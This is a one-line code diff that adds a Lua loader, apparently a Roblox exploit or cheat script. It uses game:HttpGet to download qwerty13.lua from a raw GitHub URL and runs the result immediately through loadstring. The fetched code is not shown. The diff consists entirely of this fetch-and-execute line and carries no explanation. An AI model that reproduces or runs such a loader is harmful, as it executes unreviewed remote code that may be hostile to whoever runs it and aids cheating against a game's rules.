@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs21/heads/main/qwerty13.lua"))()
